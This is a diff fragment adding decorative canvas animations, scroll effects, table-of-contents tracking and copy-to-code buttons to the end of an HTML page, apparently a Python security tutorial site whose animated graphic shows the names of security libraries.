+  Pt.prototype.draw=function(){var a=(this.life/this.maxLife)*.7*this.z;ctx.beginPath();ctx.arc(this.x,this.y,this.r*this.z,0,Math.PI*2);ctx.fillStyle='rgba('+this.color+','+a+')';ctx.fill();};
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight;}
+  function lines(){for(var i=0;i<P.length;i++){for(var j=i+1;j<P.length;j++){var a=P[i],b=P[j],dx=a.x-b.x,dy=a.y-b.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MAX){var al=(1-d/MAX)*.18,g=ctx.createLinearGradient(a.x,a.y,b.x,b.y);g.addColorStop(0,'rgba('+a.color+','+al+')');g.addColorStop(1,'rgba('+b.color+','+al+')');ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=g;ctx.lineWidth=(a.z+b.z)/2*.5;ctx.stroke();}}}}
+  function animate(){ctx.clearRect(0,0,W,H);var g=ctx.createRadialGradient(mX,mY,0,mX,mY,80);g.addColorStop(0,'rgba(0,255,65,0)');g.addColorStop(.7,'rgba(0,255,65,0.04)');g.addColorStop(1,'rgba(0,255,65,0)');ctx.fillStyle=g;ctx.beginPath();ctx.arc(mX,mY,80,0,Math.PI*2);ctx.fill();lines();P.forEach(function(p){p.update();p.draw();});requestAnimationFrame(animate);}
+  resize();window.addEventListener('resize',resize);document.addEventListener('mousemove',function(e){mX=e.clientX;mY=e.clientY;});
+  for(var i=0;i<N;i++)P.push(new Pt());animate();
+})();
+(function(){
+  var c=document.getElementById('bg-hex'),ctx=c.getContext('2d');
+  var W,H,t=0,S=40;
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight;}
+  function hex(cx,cy,s){ctx.beginPath();for(var i=0;i<6;i++){var a=Math.PI/180*(60*i-30);if(i===0)ctx.moveTo(cx+s*Math.cos(a),cy+s*Math.sin(a));else ctx.lineTo(cx+s*Math.cos(a),cy+s*Math.sin(a));}ctx.closePath();}
+  function draw(){ctx.clearRect(0,0,W,H);t+=.008;var sy=window.scrollY,cols=Math.ceil(W/(S*1.732))+2,rows=Math.ceil(H/(S*1.5))+2;for(var r=-1;r<rows;r++){for(var col=-1;col<cols;col++){var cx=col*S*1.732+(r%2)*S*.866,cy=r*S*1.5-(sy*.03)%(S*1.5),w=Math.sin(t+col*.3+r*.2)*.5+.5;hex(cx,cy,S-2);ctx.strokeStyle='rgba(0,255,65,'+(0.02+w*0.07)+')';ctx.lineWidth=.6;ctx.stroke();if(w>.92){hex(cx,cy,S-2);ctx.fillStyle='rgba(0,255,65,'+(0.02+w*0.03)+')';ctx.fill();}}}requestAnimationFrame(draw);}
+  resize();window.addEventListener('resize',resize);draw();
+})();
+(function(){
+  var c=document.getElementById('hero-geo');if(!c)return;
+  var ctx=c.getContext('2d'),SZ=500;c.width=SZ;c.height=SZ;
+  var libs=['scapy','requests','paramiko','pwntools','impacket','volatility3','hashlib','nmap','bs4','openai','re','socket','cryptography','subprocess'];
+  var rx=0,ry=0,mrx=0,mry=0,t=0;
+  var nodes=[];
+  var R=150;
+  var N=libs.length;
+  for(var i=0;i<N;i++){
+    var phi=Math.acos(1-2*(i+.5)/N);
+    var theta=Math.PI*(1+Math.sqrt(5))*i;
+    var r=Math.random()*.3+.85;
+    nodes.push({
+      x:R*r*Math.sin(phi)*Math.cos(theta),
+      y:R*r*Math.sin(phi)*Math.sin(theta),
+      z:R*r*Math.cos(phi),
+      label:libs[i],
+      pulse:Math.random()*Math.PI*2,
+      col:i<5?'0,229,255':i<10?'0,255,65':'191,0,255'
+    });
+  }
+  var edges=[];
+  for(var i=0;i<N;i++){for(var j=i+1;j<N;j++){if(Math.random()<.32)edges.push([i,j]);}}
+  document.addEventListener('mousemove',function(e){mrx=(e.clientY/innerHeight-.5)*.25;mry=(e.clientX/innerWidth-.5)*.35;});
+  function rot(x,y,z){
+    var y1=y*Math.cos(rx)-z*Math.sin(rx),z1=y*Math.sin(rx)+z*Math.cos(rx);
+    var x2=x*Math.cos(ry)+z1*Math.sin(ry),z2=-x*Math.sin(ry)+z1*Math.cos(ry);
+    return[x2,y1,z2];
+  }
+  function proj(x,y,z){var f=440,d=f/(f+z+200);return[x*d+SZ/2,y*d+SZ/2,z];}
+  function draw(){
+    ctx.clearRect(0,0,SZ,SZ);
+    rx+=.004+mrx*.007;ry+=.007+mry*.009;t+=.018;
+    var pnodes=nodes.map(function(n){var r=rot(n.x,n.y,n.z);var p=proj(r[0],r[1],r[2]);return{px:p[0],py:p[1],pz:p[2],col:n.col,label:n.label,pulse:n.pulse};});
+    edges.forEach(function(e){
+      var a=pnodes[e[0]],b=pnodes[e[1]];
+      var dep=((a.pz+b.pz)/2+200)/400;if(dep<0.1)return;
+      var g=ctx.createLinearGradient(a.px,a.py,b.px,b.py);
+      g.addColorStop(0,'rgba('+a.col+','+dep*.25+')');g.addColorStop(1,'rgba('+b.col+','+dep*.25+')');
+      ctx.beginPath();ctx.moveTo(a.px,a.py);ctx.lineTo(b.px,b.py);ctx.strokeStyle=g;ctx.lineWidth=dep*.8;ctx.stroke();
+    });
+    var order=[];for(var i=0;i<pnodes.length;i++)order.push(i);
+    order.sort(function(a,b){return pnodes[a].pz-pnodes[b].pz;});
+    order.forEach(function(i){
+      var n=pnodes[i];var dep=(n.pz+200)/400;if(dep<0.1)return;
+      var pulse=Math.sin(t*2+nodes[i].pulse)*.5+.5;
+      var r=dep*5+2;
+      var ng=ctx.createRadialGradient(n.px,n.py,0,n.px,n.py,r*3.5);
+      ng.addColorStop(0,'rgba('+n.col+','+dep*.3*pulse+')');ng.addColorStop(1,'rgba('+n.col+',0)');
+      ctx.fillStyle=ng;ctx.beginPath();ctx.arc(n.px,n.py,r*3.5,0,Math.PI*2);ctx.fill();
+      ctx.beginPath();ctx.arc(n.px,n.py,r,0,Math.PI*2);ctx.fillStyle='rgba('+n.col+','+dep*.9+')';ctx.fill();
+      if(dep>.4){
+        ctx.font=Math.floor(dep*6+4)+'px Share Tech Mono';
+        ctx.fillStyle='rgba('+n.col+','+dep*(.5+pulse*.3)+')';
+        ctx.textAlign='center';ctx.textBaseline='top';
+        ctx.fillText(n.label,n.px,n.py+r+2);
+      }
+    });
+    var cg=ctx.createRadialGradient(SZ/2,SZ/2,0,SZ/2,SZ/2,55);
+    cg.addColorStop(0,'rgba(0,255,65,0.06)');cg.addColorStop(1,'rgba(0,255,65,0)');
+    ctx.fillStyle=cg;ctx.beginPath();ctx.arc(SZ/2,SZ/2,55,0,Math.PI*2);ctx.fill();
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+var rv=new IntersectionObserver(function(e){e.forEach(function(x){if(x.isIntersecting)x.target.classList.add('on');});},{threshold:.08});
+document.querySelectorAll('.rv,.rv-l').forEach(function(el){rv.observe(el);});
+var sIds=['hero','env','network','exploit','osint','forensics','defence','ai'];
+var tItems=document.querySelectorAll('.toc-i');
+var so=new IntersectionObserver(function(e){e.forEach(function(x){if(x.isIntersecting)tItems.forEach(function(t){t.classList.toggle('active',t.dataset.s===x.target.id);});});},{threshold:.25});
+sIds.forEach(function(id){var el=document.getElementById(id);if(el)so.observe(el);});
+function goTo(h){document.querySelector(h).scrollIntoView({behavior:'smooth'});}
+document.querySelectorAll('.cb').forEach(function(b){
+  b.title='Click to copy';
+  b.addEventListener('click',function(){
+    navigator.clipboard.writeText(b.querySelector('code').innerText).catch(function(){});
+    var o=b.getAttribute('data-l');b.setAttribute('data-l',o+' \u2713 COPIED');
+    setTimeout(function(){b.setAttribute('data-l',o);},2000);
+  });
+});
+</script>
+</body>
+</html>
